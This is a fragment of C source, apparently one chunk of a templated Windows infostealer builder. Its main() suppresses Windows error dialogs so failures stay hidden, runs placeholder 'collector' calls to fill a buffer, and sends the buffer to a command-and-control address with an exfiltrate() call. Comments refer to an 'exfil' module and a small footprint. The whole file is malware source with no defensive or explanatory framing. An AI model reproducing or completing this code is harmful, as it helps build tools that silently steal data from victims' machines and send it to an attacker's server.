// chunk: arch/sequential
// depends: core/emit_buffer, exfil/*
// provides: main
// note: simple sequential execution — fastest, smallest footprint

#ifndef CHUNK_ARCH_SEQUENTIAL
#define CHUNK_ARCH_SEQUENTIAL

int main(int argc, char *argv[]) {
    (void)argc; (void)argv;
    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);

    init_buffer();
    if (!g_data) return 1;

    {{COLLECTOR_CALLS}}

    if (g_pos > 0)
        exfiltrate(C2_ADDR, C2_PORT, g_data, g_pos);

    free(g_data);
    return 0;
}

#endif
